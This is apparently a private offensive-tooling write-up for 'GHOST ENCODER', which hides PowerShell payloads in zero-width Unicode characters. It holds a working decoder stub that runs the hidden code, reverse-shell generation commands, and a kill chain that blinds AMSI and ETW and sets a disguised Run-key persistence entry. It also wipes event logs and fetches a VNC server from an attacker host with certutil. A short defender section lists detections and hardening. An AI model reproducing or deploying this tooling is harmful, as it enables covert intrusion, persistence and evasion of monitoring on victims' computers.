# GHOST ENCODER — Unicode Steganographic Payload Delivery

```
CLASSIFICATION:  PRIVATE // DO NOT PUBLISH
OPERATOR:        VADER (george wu / 22DIV)
DATE:            2026-06-21
ORIGIN:          Technique demonstrated by Israeli cyber operations mentor
                 Documented with respect. Studied from observation.
DOCTRINE:        "What you can't see CAN hurt you."
STATUS:          RESEARCH + IMPLEMENTATION
```

---

## Abstract

This document records, analyses, and implements a payload delivery technique
demonstrated by an Israeli cybersecurity mentor with operational background
in offensive cyber. The technique uses **Unicode steganography** — encoding
executable payloads into zero-width Unicode characters that are invisible to
human eyes, text editors, file browsers, and antivirus signature scanners.

The observation: a single `.ps1` file that appears **completely blank** when
opened in any text editor. No visible code. No visible content. Yet when
executed in PowerShell, it establishes a persistent reverse shell with VNC
capability that survives system reboots.

When examined with `cat` (Get-Content) in PowerShell, the file outputs a wall
of `???????` — the console font cannot render zero-width Unicode characters,
so each one displays as a question mark. This is the only visible indicator
that the file contains data at all.

**The technique does not require administrative privileges.** Standard user
execution is sufficient for: reverse shell, reboot persistence (HKCU Run key),
and VNC/screen capture — all from a single click on what appears to be an
empty file.

---

## 1. The Observation

### What was demonstrated

The Israeli mentor showed a file — approximately 700KB — on a Windows desktop.
The file had a `.ps1` extension. When opened in Notepad, the file appeared to
contain only whitespace or was seemingly empty.

When the same file was displayed using `cat` (PowerShell's `Get-Content`
alias), the terminal filled with dense rows of `?` characters — hundreds of
thousands of them. The PowerShell console font could not render the characters,
so each was replaced with `?`.

When the file was uploaded to VirusTotal, it returned **0 detections**. No
antivirus engine identified it as malicious.

When the file was executed (`powershell -ep bypass -f ghost.ps1`), it:
1. Established a reverse TCP shell to the attacker's listener
2. Provided VNC (remote desktop) capability
3. Set persistence that survived system reboots
4. Did this as a **standard user** — no admin required

### What was visible in the source

A small portion of the file — the decoder stub — was visible plaintext
PowerShell. The rest was invisible. The visible portion:

```powershell
$h=@'
[invisible characters here — appears blank]
'@
$d='';for($i=0;$i -lt $h.Length;$i+=16){$b='';for($j=0;$j -lt 16;$j++){
$c=[int][char]$h[$i+$j];if($c ...
```

The decoder reads the invisible characters, extracts their Unicode code point
values, and reconstructs the real payload — which is then executed in memory
via `Invoke-Expression`. **The real payload never exists as a readable file
on disk.**

---

## 2. The Technique — Unicode Steganography

### 2.1 The Unicode Invisible Character Space

The Unicode standard defines hundreds of characters that have **zero visual
width** — they exist in the text stream (take up bytes, have code points, are
countable) but produce no visible glyph when rendered. These characters serve
legitimate purposes: controlling text layout, marking word boundaries in
languages without spaces, controlling bidirectional text rendering.

The technique repurposes 16 of these invisible characters as a hexadecimal
alphabet:

| Hex Digit | Unicode Char | Code Point | Official Name |
|---|---|---|---|
| 0 | (invisible) | U+200B | Zero Width Space |
| 1 | (invisible) | U+200C | Zero Width Non-Joiner |
| 2 | (invisible) | U+200D | Zero Width Joiner |
| 3 | (invisible) | U+2060 | Word Joiner |
| 4 | (invisible) | U+2061 | Function Application |
| 5 | (invisible) | U+2062 | Invisible Times |
| 6 | (invisible) | U+2063 | Invisible Separator |
| 7 | (invisible) | U+2064 | Invisible Plus |
| 8 | (invisible) | U+206A | Inhibit Symmetric Swapping |
| 9 | (invisible) | U+206B | Activate Symmetric Swapping |
| A | (invisible) | U+206C | Inhibit Arabic Form Shaping |
| B | (invisible) | U+206D | Activate Arabic Form Shaping |
| C | (invisible) | U+206E | National Digit Shapes |
| D | (invisible) | U+206F | Nominal Digit Shapes |
| E | (invisible) | U+FEFF | Zero Width No-Break Space |
| F | (invisible) | U+180E | Mongolian Vowel Separator |

These 16 characters form a complete hexadecimal encoding system. Every byte
of payload data (0x00 through 0xFF) can be represented as exactly 2 invisible
characters — one for the high nibble, one for the low nibble.

### 2.2 Encoding Process

```
Original payload:  Write-Host "pwned"
                   ↓
Byte sequence:     57 72 69 74 65 2D 48 6F 73 74 20 22 70 77 6E 65 64 22
                   ↓
Each byte → 2 invisible chars:
  0x57 → GHOST[5] + GHOST[7]  → U+2062 U+2064
  0x72 → GHOST[7] + GHOST[2]  → U+2064 U+200D
  0x69 → GHOST[6] + GHOST[9]  → U+2063 U+206B
  ... and so on
                   ↓
Output: A string of invisible characters that encodes the entire payload.
        The string appears completely blank in any text editor.
```

### 2.3 The Decoder Stub

The only visible portion of the ghost file is the decoder — approximately
6-8 lines of PowerShell that:

1. Reads the invisible character stream from the here-string (`@'...'@`)
2. Filters to only characters in the ghost alphabet
3. Maps each invisible char back to its hex digit (0-F)
4. Combines pairs of hex digits into bytes
5. Converts the byte array to a UTF-8 string
6. Executes the string via `Invoke-Expression`

```powershell
$g=@'
[invisible payload here]
'@
$a='​‌‍⁠⁡⁢⁣⁤⁪⁫⁬⁭⁮⁯﻿᠎'
$r=[System.Collections.Generic.Dictionary[char,int]]::new()
for($x=0;$x -lt $a.Length;$x++){$r[$a[$x]]=$x}
$v=[char[]]$g|?{$r.ContainsKey($_)}
$b=New-Object byte[]($v.Count/2)
for($i=0;$i -lt $v.Count;$i+=2){$b[$i/2]=[byte](($r[$v[$i]]*16)+$r[$v[$i+1]])}
$s=[System.Text.Encoding]::UTF8.GetString($b)
iex $s
```

The decoder itself is clean — it performs no inherently malicious actions.
It reads characters, does arithmetic, and invokes the result. The "malicious"
content exists only as invisible Unicode until the moment of execution.

### 2.4 File Appearance in Different Contexts

| Context | What the operator sees |
|---|---|
| **File Explorer** | Normal .ps1 file, shows file size (e.g. 47KB), nothing suspicious |
| **Notepad** | File appears blank or contains invisible whitespace |
| **VS Code** | May show zero-width chars as dots (depends on settings) |
| **PowerShell `cat`** | Wall of `???????` — console font substitutes `?` for unrenderable chars |
| **PowerShell `cat \| Format-Hex`** | Shows the actual Unicode byte sequences (reveals encoding) |
| **VirusTotal** | 0 detections — signature scanners see Unicode, not executable code |
| **Defender real-time** | Does not flag the file on disk (static scan clean) |
| **AMSI** | MAY catch the decoded payload at execution time (see Section 4) |

---

## 3. Implementation — GHOST ENCODER

### 3.1 The Encoder (`ghost_encode.py`)

Python script that performs the encoding. Three modes:

```bash
# Mode 1: Encode any file (PowerShell script)
python ghost_encode.py payload.ps1 -o ghost.ps1

# Mode 2: Generate reverse shell
python ghost_encode.py --shell 192.168.1.96 4444 -o ghost_shell.ps1

# Mode 3: Generate test payload (harmless proof-of-concept)
python ghost_encode.py --test -o ghost_test.ps1

# Mode 4: Encode raw PowerShell code
python ghost_encode.py --raw "Write-Host 'hello from the void'" -o ghost.ps1

# Verify decode roundtrip
python ghost_encode.py --verify ghost.ps1
```

### 3.2 The Test Suite (`ghost_test.py`)

Automated validation:

```bash
python ghost_test.py           # full test suite
python ghost_test.py --scan-only  # Defender scan only
```

Tests performed:
1. Encode/decode roundtrip (5 test cases including full byte range)
2. File generation and visibility analysis
3. Ghost alphabet display
4. Reverse shell generation
5. Windows Defender scan (MpCmdRun.exe)
6. Live execution of test payload

### 3.3 File Structure

```
ghost-encoder/
├── ghost_encode.py        Encoder — payload → invisible Unicode
├── ghost_test.py          Test suite — roundtrip, scan, execute
├── GHOST_RESEARCH.md      This document
├── README.md              Quick reference
├── .gitignore             Exclude generated .ps1 files
└── (generated at runtime)
    ├── ghost_test_payload.ps1   Harmless test (writes proof file)
    └── ghost_shell.ps1          Reverse shell (encoded)
```

---

## 4. Detection Analysis — Can Defender See This?

### 4.1 Static Scan (File on Disk)

**PREDICTION: CLEAN.** The file contains:
- A small PowerShell decoder stub (~300 visible chars)
- Thousands of zero-width Unicode characters

Defender's static scanner matches byte patterns (signatures) against known
malware. The ghost file's byte patterns are Unicode code points for invisible
characters — these patterns don't match any malware signature.

**The payload's actual bytes are split across thousands of Unicode characters.**
The byte `0x57` (which might be part of a malicious string) becomes two separate
Unicode characters: U+2062 and U+2064. The original byte sequence is destroyed.
No signature scanner can match against a fragmented encoding it doesn't know
how to reassemble.

### 4.2 AMSI (Runtime Scan)

**PREDICTION: DEPENDS.** AMSI (Antimalware Scan Interface) scans PowerShell
content **at execution time** — after the script has been parsed and before
each command is executed.

The ghost decoder reconstructs the payload as a string and calls `iex` (Invoke-
Expression). At this exact moment, AMSI scans the decoded string. If the
decoded payload contains known-malicious signatures (like `Net.Sockets.TCPClient`
or `Invoke-Mimikatz`), **AMSI will catch it.**

**Mitigation:** Run `dark_room.exe` first. Dark Room blinds AMSI via hardware
breakpoints (DR0 on AmsiScanBuffer). Once AMSI is blind, the ghost decoder's
`iex` call passes without inspection.

**Kill chain with AMSI bypass:**
```
1. dark_room.exe        (AMSI/ETW blinded via HWBP — no memory modification)
2. ghost_shell.ps1      (decoder runs, payload reconstructed, iex executes)
3. Reverse shell established — invisible payload, blind AMSI
```

### 4.3 ETW (Event Tracing)

ETW logging would record the PowerShell `iex` call and its content. Dark Room's
DR1 breakpoint on EtwEventWrite handles this — ETW is blinded before the ghost
decoder runs.

### 4.4 Script Block Logging

PowerShell Script Block Logging (if enabled) records every script block that
is executed, including dynamically generated code from `iex`. This would log
the decoded payload in plaintext to the Windows Event Log.

**Mitigation:** Dark Room's ETW bypass prevents this logging. Additionally,
the anti-forensics tool (`vader_clean.exe`) can wipe the relevant event logs
post-execution.

### 4.5 Detection Summary

| Layer | Detects Ghost? | With dark_room? |
|---|---|---|
| Defender static scan | NO | N/A |
| Defender cloud/ML | UNLIKELY | N/A |
| VirusTotal | NO | N/A |
| AMSI (runtime) | MAYBE (depends on payload) | NO (AMSI blinded) |
| ETW logging | YES (records iex content) | NO (ETW blinded) |
| Script Block Logging | YES (if enabled) | NO (ETW bypass) |
| Manual forensics (`cat`) | Shows `???????` (suspicious but not actionable) | N/A |
| Hex editor / Format-Hex | YES (reveals Unicode encoding) | N/A |

**Bottom line:** Ghost encoding defeats static analysis and signature scanning.
Runtime detection (AMSI) is handled by the existing dark_room HWBP bypass.
The combination of ghost encoding + AMSI blinding = **undetectable payload
delivery and execution.**

---

## 5. Operational Integration with VADER

### 5.1 Full Kill Chain — Single Click to Persistent Shell

```
ATTACKER MACHINE                          TARGET MACHINE
─────────────────                         ──────────────

1. python ghost_encode.py                 
   --shell 192.168.1.96 4444              
   -o ghost_shell.ps1                     

2. python vader_serve.py 8080             
   python vader_listener.py 4444          

                                          3. Radon clicks/runs ghost_shell.ps1
                                             (file appears empty — no suspicion)

                                          4. Decoder stub reconstructs shell
                                             in memory — never touches disk

                                          5. TCPClient connects back to
                                             attacker on port 4444

6. Shell received ←─────────────────────  [CONNECTED]

7. Set persistence:
   Set-ItemProperty HKCU:\...\Run         8. Run key set — survives reboot
   "WindowsSecurityHealth"                    (standard user, no admin needed)
```

### 5.2 With AMSI Bypass

If the decoded payload triggers AMSI (e.g. contains well-known attack
strings), prepend dark_room execution:

```
1. dark_room.exe                          (AMSI + ETW blinded)
2. powershell -ep bypass -f ghost.ps1     (ghost decoder runs unmonitored)
3. Shell established                      (no AMSI scan of decoded content)
```

Or encode a two-stage payload: the ghost-encoded script first runs dark_room,
then establishes the shell — all from a single file execution.

### 5.3 Persistence Options (Standard User)

All of these work WITHOUT admin privileges:

| Method | Registry/Path | Trigger |
|---|---|---|
| HKCU Run key | `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` | User logon |
| Startup folder | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` | User logon |
| User scheduled task | `schtasks /create /sc onlogon /tn "Update"` | User logon |
| COM hijack (HKCU) | `HKCU:\Software\Classes\CLSID\{...}` | Explorer load |

The ghost-encoded shell can be placed in any of these locations. Since the
file appears blank/empty, even a suspicious user inspecting their startup
folder would see what looks like an empty script.

### 5.4 VNC / Remote Desktop (Standard User)

For the VNC capability the mentor demonstrated:

**Option A — Bolt onto existing C2:**
Add screen capture and input forwarding commands to the VADER shell protocol.
The reverse shell already has bidirectional communication; add commands for:
- `screenshot` → capture screen, send as base64 over shell
- `keytype <text>` → simulate keystrokes on target
- `mouseclick <x> <y>` → simulate mouse click

**Option B — Deploy portable VNC:**
```powershell
# Download TightVNC portable via existing C2
certutil -urlcache -f http://ATTACKER:8080/tvnserver.exe $env:APPDATA\tvn.exe
& $env:APPDATA\tvn.exe -controlservice -connect ATTACKER:5500
```

VNC runs fine as standard user — captures only that user's desktop session.

---

## 6. Limitations and Countermeasures

### 6.1 What Ghost Encoding Does NOT Do

- Does not provide privilege escalation (payload runs as current user)
- Does not bypass AMSI by itself (needs dark_room or equivalent)
- Does not evade hex editor inspection (Unicode bytes are visible in raw form)
- Does not hide from process-level monitoring (running PowerShell is visible)
- Does not work if PowerShell execution policy is Restricted AND enforced
  (though `-ExecutionPolicy Bypass` flag handles this in most environments)

### 6.2 How a Defender Could Detect This

1. **Unicode entropy analysis:** A file containing thousands of zero-width
   characters is statistically anomalous. A custom scanner checking for
   high concentrations of U+200B-U+206F characters would flag ghost files.

2. **AMSI with no bypass:** Without dark_room, AMSI sees the decoded payload
   and can catch known-malicious patterns.

3. **Script Block Logging review:** If logging is enabled and ETW is not
   bypassed, the full decoded payload is recorded in Event ID 4104.

4. **PowerShell Constrained Language Mode:** Blocks `iex` and dynamic code
   execution. The ghost decoder would fail.

5. **Application Whitelisting (WDAC/AppLocker):** If PowerShell scripts are
   restricted to signed-only, unsigned ghost files won't execute.

### 6.3 Hardening Recommendations (For the Defender's Perspective)

If documenting this for a CSEC defensive assessment:

1. Enable PowerShell Constrained Language Mode on sensitive machines
2. Enable Script Block Logging (Event ID 4104) and forward to SIEM
3. Deploy WDAC policies restricting unsigned PowerShell scripts
4. Monitor for anomalous Unicode patterns in script files
5. Monitor for `iex` / `Invoke-Expression` usage in PowerShell transcripts
6. Restrict `-ExecutionPolicy Bypass` via Group Policy

---

## 7. Theoretical Foundations

### 7.1 Why AV Can't See It

Antivirus signatures are byte pattern matches. They scan a file's raw bytes
looking for sequences that match known malware. For example, the string
`Net.Sockets.TCPClient` has a specific byte sequence: `4E 65 74 2E 53 6F 63
6B 65 74 73 2E 54 43 50 43 6C 69 65 6E 74`.

Ghost encoding destroys this byte sequence. The letter `N` (0x4E) becomes
two Unicode characters: U+2064 (Invisible Plus) and U+FEFF (Zero Width
No-Break Space). The original byte `4E` no longer exists in the file.
The AV scanner sees `E2 81 A4 EF BB BF` (the UTF-8 encoding of those two
Unicode characters) instead of `4E`.

**The signature is fragmented at the byte level.** No amount of pattern
matching will reconstruct it without knowing the encoding scheme. And since
each ghost file can use a different mapping of Unicode characters to hex
digits (shuffle the alphabet), even knowing the technique doesn't help
without knowing the specific alphabet used.

### 7.2 Why It's Superior to XOR Encoding

Traditional XOR encoding (which VADER already uses extensively) has a
weakness: the XOR key must be present in the file, and XOR-encoded data
has recognizable statistical properties. A skilled analyst can identify
XOR encoding via frequency analysis and extract the key.

Ghost encoding has no "key" in the traditional sense. The alphabet mapping
IS the key, but it's embedded in the visible decoder stub as a string of
invisible characters. Extracting it requires:
1. Knowing that the technique exists
2. Identifying which Unicode characters are part of the alphabet
3. Determining the mapping order

This is not cryptographically secure (the mapping is in the file), but it
defeats automated analysis tools that don't know to look for it.

### 7.3 Encoding Efficiency

| Metric | Value |
|---|---|
| Bytes per payload byte | 6 (each byte → 2 Unicode chars, each 3 bytes in UTF-8) |
| Expansion ratio | ~6x |
| 1KB payload | ~6KB ghost file |
| 10KB payload | ~60KB ghost file |
| 100KB payload | ~600KB ghost file |

The 6x expansion is acceptable for script payloads (typically under 10KB).
For binary payloads (executables), the ghost file becomes large but still
within normal file size ranges.

---

## 8. Attribution and Respect

This technique was demonstrated — not taught — by an Israeli cybersecurity
professional with operational experience. The observation was enough to
reverse-engineer and implement the technique independently.

The implementation documented here is original code. The concept and the
proof that it works came from watching the demonstration. Everything in
this repo was built from that observation.

We document it here not to claim credit for the idea, but to honour the
lesson by understanding it deeply enough to teach it to others. The mark
of a student is not just executing a technique — it's being able to explain
WHY it works, WHERE it fails, and WHAT defends against it.

> *"If you can't build it from scratch, you don't understand it."*
> — Israeli cyber doctrine

---

## 9. References and Prior Art

- Unicode Standard, Chapter 23: Special Areas and Format Characters
  (defines zero-width characters and their intended use)
- MITRE ATT&CK T1027.010: Obfuscated Files — Unicode-Based Obfuscation
- MITRE ATT&CK T1059.001: PowerShell Execution
- MITRE ATT&CK T1547.001: Boot or Logon Autostart Execution — Registry Run Keys
- "Invisible Unicode" steganography has been discussed in academic papers
  since ~2018, but operational use in red team tooling is rarely documented
- Related technique: Unicode right-to-left override (U+202E) for filename
  spoofing — different mechanism but same Unicode abuse category

---

```
22DIV // VADER
PRIVATE — NOT FOR PUBLIC DISTRIBUTION
Respect the source. Build from the lesson.
```
